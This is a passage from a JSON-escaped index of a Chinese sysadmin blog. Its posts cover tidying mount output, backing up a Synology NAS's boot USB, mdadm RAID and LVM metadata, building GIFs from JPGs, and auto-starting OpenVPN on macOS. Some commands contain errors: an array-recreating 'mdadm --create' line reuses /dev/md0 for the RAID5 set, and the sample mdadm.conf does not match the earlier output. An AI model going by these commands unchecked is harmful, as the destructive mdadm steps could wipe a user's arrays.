\u003cspan class=\"nb\"\u003etype\u003c/span\u003e sysfs \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edevpts on /dev/pts \u003cspan class=\"nb\"\u003etype\u003c/span\u003e devpts \u003cspan class=\"o\"\u003e(\u003c/span\u003erw,gid\u003cspan class=\"o\"\u003e=\u003c/span\u003e5,mode\u003cspan class=\"o\"\u003e=\u003c/span\u003e620\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etmpfs on /dev/shm \u003cspan class=\"nb\"\u003etype\u003c/span\u003e tmpfs \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda1 on /boot \u003cspan class=\"nb\"\u003etype\u003c/span\u003e ext4 \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enone on /proc/sys/fs/binfmt_misc \u003cspan class=\"nb\"\u003etype\u003c/span\u003e binfmt_misc \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esunrpc on /var/lib/nfs/rpc_pipefs \u003cspan class=\"nb\"\u003etype\u003c/span\u003e rpc_pipefs \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eYou have mail in /var/spool/mail/root  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e乱作一团，那么怎么让这些显示整齐一些呢？\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emount \u003cspan class=\"p\"\u003e|\u003c/span\u003ecolumn -t  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda3  on  /                         \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  ext4         \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eproc       on  /proc                     \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  proc         \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esysfs      on  /sys                      \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  sysfs        \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edevpts     on  /dev/pts                  \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  devpts       \u003cspan class=\"o\"\u003e(\u003c/span\u003erw,gid\u003cspan class=\"o\"\u003e=\u003c/span\u003e5,mode\u003cspan class=\"o\"\u003e=\u003c/span\u003e620\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etmpfs      on  /dev/shm                  \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  tmpfs        \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda1  on  /boot                     \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  ext4         \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enone       on  /proc/sys/fs/binfmt_misc  \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  binfmt_misc  \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esunrpc     on  /var/lib/nfs/rpc_pipefs   \u003cspan class=\"nb\"\u003etype\u003c/span\u003e  rpc_pipefs   \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e整齐多了，对吧。\u003c/p\u003e","title":"linu下如何让mount显示的很整齐"},{"content":"数据很重要、数据很重要、数据很重要！！！\n重要的话说三遍，话说自己买了个黑群晖，6盘位的，就是为了保存照片和数据\u0026hellip;\u0026hellip;\n其实1盘和2盘的nas都是耍流氓，根本无用，必须是4盘位以上的才勉强可靠。所以才买的这个黑群晖，只买了3个盘做了raid5，侥是如此，真的是莫名坏了一块，好在在保修期内，更换一块后故障解除，期间倒腾2块盘的数据依然是噩梦啊。\n那么数据如此重要，那么怎么做到完全的备份呢？\n数据是3盘raid5，已经有保证了，剩下就是系统也必须有备份可恢复才可以\n群晖本质是linux，文件系统是mdadm+lvm，所以备份也必须从这个方向开始。\n首先是备份启动的usb盘，先fdisk -l 看一下：\nDisk /dev/sda: 2000.3 GB, 2000398934016 bytes 255 heads, 63 sectors/track, 243201 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System /dev/sda1 1 311 2490240 fd Linux raid autodetect Partition 1 does not end on cylinder boundary /dev/sda2 311 572 2097152 fd Linux raid autodetect Partition 2 does not end on cylinder boundary /dev/sda3 588 243201 1948793440+ fd Linux raid autodetect Disk /dev/sdb: 2000.3 GB, 2000398934016 bytes 255 heads, 63 sectors/track, 243201 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System /dev/sdb1 1 311 2490240 fd Linux raid autodetect Partition 1 does not end on cylinder boundary /dev/sdb2 311 572 2097152 fd Linux raid autodetect Partition 2 does not end on cylinder boundary /dev/sdb3 588 243201 1948793440+ fd Linux raid autodetect Disk /dev/sdc: 2000.3 GB, 2000398934016 bytes 255 heads, 63 sectors/track, 243201 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System /dev/sdc1 1 311 2490240 fd Linux raid autodetect Partition 1 does not end on cylinder boundary /dev/sdc2 311 572 2097152 fd Linux raid autodetect Partition 2 does not end on cylinder boundary /dev/sdc3 588 243201 1948793440+ fd Linux raid autodetect Disk /dev/sdu: 4227 MB, 4227858432 bytes 4 heads, 32 sectors/track, 64512 cylinders Units = cylinders of 128 * 512 = 65536 bytes Device Boot Start End Blocks Id System /dev/sdu1 * 1 256 16352+ e Win95 FAT16 (LBA) 3块2T的盘，每个盘有3个分区，然后最后是USB盘，盘符sdu，备份它\ndd if=/dev/sdu |gzip -c \u0026gt; /root/usb.img USB盘备好了，下面得备份raid了，先查看raid信息：\ncat /proc/mdstat Personalities : [linear] [raid0] [raid1] [raid10] [raid6] [raid5] [raid4] md2 : active raid5 sda3[0] sdc3[2] sdb3[1] 3897584512 blocks super 1.2 level 5, 64k chunk, algorithm 2 [3/3] [UUU] md1 : active raid1 sda2[0] sdb2[1] sdc2[2] 2097088 blocks [12/3] [UUU___] md0 : active raid1 sda1[0] sdb1[1] sdc1[2] 2490176 blocks [12/3] [UUU___] 看来有三个raid组，md0和md1是raid1，md2是raid5\nmd0的组员是sda1、sdb1、sdc1\nmd1的组员是sda2、sdb2、sdc2\nmd2的组员是sda3、sdb3、sdc3\n三个盘的分区应该是一样的，我们看一个即可：\nfdisk -l /dev/sda Disk /dev/sda: 2000.3 GB, 2000398934016 bytes 255 heads, 63 sectors/track, 243201 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System /dev/sda1 1 311 2490240 fd Linux raid autodetect Partition 1 does not end on cylinder boundary /dev/sda2 311 572 2097152 fd Linux raid autodetect Partition 2 does not end on cylinder boundary /dev/sda3 588 243201 1948793440+ fd Linux raid autodetect 我们可以看到是2T的盘，三个分区的起始柱头信息都很清晰，记录下来。\n所以，如果坏了，看看分区，分区没坏直接进行下一步，分区坏了的话，我们先fdisk分好区，然后开始修复：\n查看各个md的uuid：\nmdadm --examine --scan /dev/sda1 /dev/sdb1 /dev/sdc1 ARRAY /dev/md0 UUID=35d393bd:1f4dde6b:3017a5a8:c86610be mdadm --examine --scan /dev/sda2 /dev/sdb2 /dev/sdc2 ARRAY /dev/md1 UUID=8f02f0d4:e249900a:3017a5a8:c86610be mdadm --examine --scan /dev/sda3 /dev/sdb3 /dev/sdc3 ARRAY /dev/md/2 metadata=1.2 UUID=d1411045:24723563:3a19cef5:07732afa name=DiskStation:2 修复的时候，根据上面信息，编辑生成/etc/mdadm.conf，注意顺序是倒的， md0-\u0026gt;md1-\u0026gt;md2，devices中如果一块盘坏了，改成missing\u0026hellip;\u0026hellip;\nDEVICE partitions ARRAY /dev/md0 level=raid1 num-devices=2 ↪UUID=b3cd99e7:d02be486:b0ea429a:e18ccf65 ↪devices=/dev/sda1,missing ARRAY /dev/md1 level=raid1 num-devices=2 ↪UUID=75fa22aa:9a11bcad:b42ed14a:b5f8da3c ↪devices=/dev/sda2,missing ARRAY /dev/md2 level=raid1 num-devices=2 ↪UUID=532502de:90e44fb0:242f485f:f02a2565 ↪devices=/dev/sda3,missing 然后刷新raid并查看raid是否正常\nmdadm -A -s cat /proc/mdstat 如果要全面毁了盘阵，重建md，方法如下：\nmdadm --create --verbose /dev/md0 --level=1 --raid-devices=3 /dev/sda1 /dev/sdb1 /dev/sdc1 mdadm --create --verbose /dev/md1 --level=1 --raid-devices=3 /dev/sda2 /dev/sdb2 /dev/sdc2 mdadm --create --verbose /dev/md0 --level=5 --raid-devices=3 /dev/sda3 /dev/sdb3 /dev/sdc3 上面已经做好了RAID部分MD的备份。LVM是基于MD之上的，下面我们来备份LVM。\n首先查看卷信息：\nDiskStation\u0026gt; pvdisplay --- Physical volume --- PV Name /dev/md2 VG Name vg1 PV Size 3.63 TB / not usable 2.88 MB Allocatable yes (but full) PE Size (KByte) 4096 Total PE 951558 Free PE 0 Allocated PE 951558 PV UUID 5li2xk-tZdQ-c63W-qpM7-jo9F-5xGg-xFP1Wr DiskStation\u0026gt; vgdisplay --- Volume group --- VG Name vg1 System ID Format lvm2 Metadata Areas 1 Metadata Sequence No 3 VG Access read/write VG Status resizable MAX LV 0 Cur LV 2 Open LV 1 Max PV 0 Cur PV 1 Act PV 1 VG Size 3.63 TB PE Size 4.00 MB Total PE 951558 Alloc PE / Size 951558 / 3.63 TB Free PE / Size 0 / 0 VG UUID UUCftW-HIFK-vmL0-0MTG-XzOT-BCTI-okhVf3 DiskStation\u0026gt; lvdisplay --- Logical volume --- LV Name /dev/vg1/syno_vg_reserved_area VG Name vg1 LV UUID BmrrfE-vjMY-rJO8-C7OP-2los-KfeO-1hBrWb LV Write Access read/write LV Status available # open 0 LV Size 12.00 MB Current LE 3 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 384 Block device 253:0 --- Logical volume --- LV Name /dev/vg1/volume_1 VG Name vg1 LV UUID 80vCET-1yH4-KMXS-E0N7-3tiP-m24I-Gzw7ij LV Write Access read/write LV Status available # open 1 LV Size 3.63 TB Current LE 951555 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 4096 Block device 253:1 ok, 备份\nvgcfgbackup 备份文件会放到/etc/lvm/backup/vg1，把这个文件拷走.\n如果要恢复：\nvgcfgrestore -f vg1 vg1 pvscan vgscan lvscan 把u盘文件、fdisk文件、lvm的文件拷出来放到dropbox，一切就妥当了。\n","permalink":"https://rendoumi.com/posts/20240119-qunhui_backup/","summary":"\u003cp\u003e数据很重要、数据很重要、数据很重要！！！\u003c/p\u003e\n\u003cp\u003e重要的话说三遍，话说自己买了个黑群晖，6盘位的，就是为了保存照片和数据\u0026hellip;\u0026hellip;\u003c/p\u003e\n\u003cp\u003e其实1盘和2盘的nas都是耍流氓，根本无用，必须是4盘位以上的才勉强可靠。所以才买的这个黑群晖，只买了3个盘做了raid5，侥是如此，真的是莫名坏了一块，好在在保修期内，更换一块后故障解除，期间倒腾2块盘的数据依然是噩梦啊。\u003c/p\u003e\n\u003cp\u003e那么数据如此重要，那么怎么做到完全的备份呢？\u003c/p\u003e\n\u003cp\u003e数据是3盘raid5，已经有保证了，剩下就是系统也必须有备份可恢复才可以\u003c/p\u003e\n\u003cp\u003e群晖本质是linux，文件系统是mdadm+lvm，所以备份也必须从这个方向开始。\u003c/p\u003e\n\u003cp\u003e首先是备份启动的usb盘，先fdisk -l 看一下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk /dev/sda: 2000.3 GB, \u003cspan class=\"m\"\u003e2000398934016\u003c/span\u003e bytes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e255\u003c/span\u003e heads, \u003cspan class=\"m\"\u003e63\u003c/span\u003e sectors/track, \u003cspan class=\"m\"\u003e243201\u003c/span\u003e cylinders  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUnits\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e cylinders of \u003cspan class=\"m\"\u003e16065\u003c/span\u003e * \u003cspan class=\"nv\"\u003e512\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e8225280\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   Device Boot      Start         End      Blocks  Id System\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda1               \u003cspan class=\"m\"\u003e1\u003c/span\u003e         \u003cspan class=\"m\"\u003e311\u003c/span\u003e     \u003cspan class=\"m\"\u003e2490240\u003c/span\u003e  fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePartition \u003cspan class=\"m\"\u003e1\u003c/span\u003e does not end on cylinder boundary  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda2             \u003cspan class=\"m\"\u003e311\u003c/span\u003e         \u003cspan class=\"m\"\u003e572\u003c/span\u003e     \u003cspan class=\"m\"\u003e2097152\u003c/span\u003e  fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePartition \u003cspan class=\"m\"\u003e2\u003c/span\u003e does not end on cylinder boundary  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda3             \u003cspan class=\"m\"\u003e588\u003c/span\u003e      \u003cspan class=\"m\"\u003e243201\u003c/span\u003e  1948793440+ fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk /dev/sdb: 2000.3 GB, \u003cspan class=\"m\"\u003e2000398934016\u003c/span\u003e bytes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e255\u003c/span\u003e heads, \u003cspan class=\"m\"\u003e63\u003c/span\u003e sectors/track, \u003cspan class=\"m\"\u003e243201\u003c/span\u003e cylinders  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUnits\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e cylinders of \u003cspan class=\"m\"\u003e16065\u003c/span\u003e * \u003cspan class=\"nv\"\u003e512\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e8225280\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   Device Boot      Start         End      Blocks  Id System\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sdb1               \u003cspan class=\"m\"\u003e1\u003c/span\u003e         \u003cspan class=\"m\"\u003e311\u003c/span\u003e     \u003cspan class=\"m\"\u003e2490240\u003c/span\u003e  fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePartition \u003cspan class=\"m\"\u003e1\u003c/span\u003e does not end on cylinder boundary  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sdb2             \u003cspan class=\"m\"\u003e311\u003c/span\u003e         \u003cspan class=\"m\"\u003e572\u003c/span\u003e     \u003cspan class=\"m\"\u003e2097152\u003c/span\u003e  fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePartition \u003cspan class=\"m\"\u003e2\u003c/span\u003e does not end on cylinder boundary  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sdb3             \u003cspan class=\"m\"\u003e588\u003c/span\u003e      \u003cspan class=\"m\"\u003e243201\u003c/span\u003e  1948793440+ fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk /dev/sdc: 2000.3 GB, \u003cspan class=\"m\"\u003e2000398934016\u003c/span\u003e bytes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e255\u003c/span\u003e heads, \u003cspan class=\"m\"\u003e63\u003c/span\u003e sectors/track, \u003cspan class=\"m\"\u003e243201\u003c/span\u003e cylinders  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUnits\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e cylinders of \u003cspan class=\"m\"\u003e16065\u003c/span\u003e * \u003cspan class=\"nv\"\u003e512\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e8225280\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   Device Boot      Start         End      Blocks  Id System\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sdc1               \u003cspan class=\"m\"\u003e1\u003c/span\u003e         \u003cspan class=\"m\"\u003e311\u003c/span\u003e     \u003cspan class=\"m\"\u003e2490240\u003c/span\u003e  fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePartition \u003cspan class=\"m\"\u003e1\u003c/span\u003e does not end on cylinder boundary  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sdc2             \u003cspan class=\"m\"\u003e311\u003c/span\u003e         \u003cspan class=\"m\"\u003e572\u003c/span\u003e     \u003cspan class=\"m\"\u003e2097152\u003c/span\u003e  fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePartition \u003cspan class=\"m\"\u003e2\u003c/span\u003e does not end on cylinder boundary  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sdc3             \u003cspan class=\"m\"\u003e588\u003c/span\u003e      \u003cspan class=\"m\"\u003e243201\u003c/span\u003e  1948793440+ fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk /dev/sdu: \u003cspan class=\"m\"\u003e4227\u003c/span\u003e MB, \u003cspan class=\"m\"\u003e4227858432\u003c/span\u003e bytes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e4\u003c/span\u003e heads, \u003cspan class=\"m\"\u003e32\u003c/span\u003e sectors/track, \u003cspan class=\"m\"\u003e64512\u003c/span\u003e cylinders  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUnits\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e cylinders of \u003cspan class=\"m\"\u003e128\u003c/span\u003e * \u003cspan class=\"nv\"\u003e512\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e65536\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   Device Boot      Start         End      Blocks  Id System\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sdu1   *           \u003cspan class=\"m\"\u003e1\u003c/span\u003e         \u003cspan class=\"m\"\u003e256\u003c/span\u003e       16352+  e Win95 FAT16 \u003cspan class=\"o\"\u003e(\u003c/span\u003eLBA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e3块2T的盘，每个盘有3个分区，然后最后是USB盘，盘符sdu，备份它\u003c/p\u003e","title":"群晖(黑群晖)的备份"},{"content":"用ffmpeg就很简单了\n首先把要合并的jpg都变成合适的尺寸\nconvert -resize 300x *.jpg 然后变gif\nconvert -delay 30 -loop 0 1.jpg 2.jpg 3.jpg 4.jpg result.gif -loop 0 表示无限循环 -delay 30 表示每帧之间等待的时间\n","permalink":"https://rendoumi.com/posts/20240119-jpg_gif/","summary":"\u003cp\u003e用ffmpeg就很简单了\u003c/p\u003e\n\u003cp\u003e首先把要合并的jpg都变成合适的尺寸\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econvert -resize 300x *.jpg  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后变gif\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econvert -delay \u003cspan class=\"m\"\u003e30\u003c/span\u003e -loop \u003cspan class=\"m\"\u003e0\u003c/span\u003e 1.jpg 2.jpg 3.jpg 4.jpg result.gif  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e-loop 0 表示无限循环 -delay 30 表示每帧之间等待的时间\u003c/p\u003e","title":"如何把jpg合成gif"},{"content":"没办法，网络环境太烂，只能装个openvpn client连接到服务器，系统是mac，要求一直保持连接，还要能重启自动连。\n安装过程如下：\n1.安装openvpn\nbrew install openvpn 2.安装tun/tap驱动\nwget http://downloads.sourceforge.net/tuntaposx/tuntap_20150118.tar.gz tar zxvf tuntap_20150118.tar.gz 然后在mac os桌面下，双击tuntap_20150118.pkg安装 3.准备client.conf文件，这个文件就是标准的client端文件\n4.测试是否可以正常启动\n/usr/local/opt/openvpn/sbin/openvpn --config /usr/local/etc/openvpn/ddky.conf 5.测试成功后在mac os编写plist文件\nvi /Library/LaunchDaemons/net.openvpn.plist \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple Computer//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;Label\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;net.openvpn\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;KeepAlive\u0026lt;/key\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;NetworkState\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;key\u0026gt;Program\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;/usr/local/opt/openvpn/sbin/openvpn\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;ProgramArguments\u0026lt;/key\u0026gt; \u0026lt;array\u0026gt; \u0026lt;string\u0026gt;openvpn\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;--config\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;/usr/local/etc/openvpn/client.conf\u0026lt;/string\u0026gt; \u0026lt;/array\u0026gt; \u0026lt;key\u0026gt;RunAtLoad\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;TimeOut\u0026lt;/key\u0026gt; \u0026lt;integer\u0026gt;90\u0026lt;/integer\u0026gt; \u0026lt;key\u0026gt;WorkingDirectory\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;/usr/local/etc/openvpn\u0026lt;/string\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; 6.然后运行\nsudo chown root:wheel /Library/LaunchDaemon/net.openvpn.plist sudo launchctl load /Library/LaunchDaemon/net.openvpn.plist 有用的命令：\nsudo launchctl load /Library/LaunchDaemon/net.openvpn.plist sudo launchctl unload /Library/LaunchDaemon/net.openvpn.plist sudo launchctl start /Library/LaunchDaemon/net.openvpn sudo launchctl stop /Library/LaunchDaemon/net.openvpn ","permalink":"https://rendoumi.com/posts/20240119-macos_vpn/","summary":"\u003cp\u003e没办法，网络环境太烂，只能装个openvpn client连接到服务器，系统是mac，要求一直保持连接，还要能重启自动连。\u003c/p\u003e\n\u003cp\u003e安装过程如下：\u003c/p\u003e\n\u003cp\u003e1.安装openvpn\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebrew install openvpn  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e2.安装tun/tap驱动\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://downloads.sourceforge.net/tuntaposx/tuntap_20150118.tar.gz  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf tuntap_20150118.tar.gz  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e然后在mac 